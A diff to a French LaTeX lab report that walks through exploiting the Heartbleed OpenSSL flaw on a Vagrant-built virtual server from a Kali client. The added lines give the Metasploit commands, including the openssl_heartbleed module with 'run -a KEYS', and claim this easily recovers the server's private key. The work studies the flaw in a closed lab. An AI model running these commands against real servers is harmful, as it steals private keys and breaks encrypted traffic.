@@ -100,25 +100,31 @@ Avant la correction de cette faille de sécurite, il était possible de fermet c
 
 Nous utilisons vagrant pour lancer notre machine virtuelle. La commande \textit{vagrant up} permet de créer la machine virtuelle avec virtualbox. Tous les outils necessaires à l'expérimentation sont installé sur la machine virtuelle. Cette machine virtuelle joue le role du serveur. Une autre machine, cette fois cliente, est installé avec Kali Linux afin d'exploiter la faille. 
 
-Pour lancer les machines, dirigez vous dans le dossier "experimentation" puis lancez la commande "vagrant up". Cette commande va installer les machines. 
-Une fois installé, lancer la commande "vagrant ssh client" pour connecter à la machine cliente (kali).
+Pour lancer les machines, dirigez vous dans le dossier "experimentation" puis lancez la commande \texttt{vagrant up}. Cette commande va installer les machines.
+
+
+Une fois installé, lancer la commande "vagrant ssh client" pour connecter à la machine cliente (Kali).
  
-Maintenant lancez les commandes : \\
-sudo apt-get update \\
-sudo apt-get upgrade 
-# l'upgrade est très long, faites entrer a chaque interaction
+Maintenant lancez les commandes :
 
-sudo msfupdate\\
-sudo msfconsole\\
+\begin{verbatim}
+sudo apt-get update
+sudo apt-get upgrade #l'upgrade est très long, faites entrer a chaque interaction
 
-puis dans la console:\\
-use auxiliary/scanner/ssl/openssl\_heartbleed\\
-set RHOTS <votreip> \\
-set RPORT 13443\\
-set verbose true\\
-run\\
+sudo msfupdate
+sudo msfconsole
+\end{verbatim}
 
-On peut voir des informations récupérées, dans la catégorie "Printable info leaked". Avec des outils plus poussés et de nombreuses requêtes, il est possible de récupérer la clef privée. 
+puis dans la console:
+\begin{verbatim}
+use auxiliary/scanner/ssl/openssl\_heartbleed
+set RHOSTS <votreip> 
+set RPORT 13443
+set verbose true
+run -a KEYS
+\end{verbatim}
+
+On voit que cet exploit nous permet de récupérer automatiquement et particulièrement facilement la clé privée du serveur.
 
 % outil plus puissant à installer sur kali : https://github.com/robertdavidgraham/heartleech
 
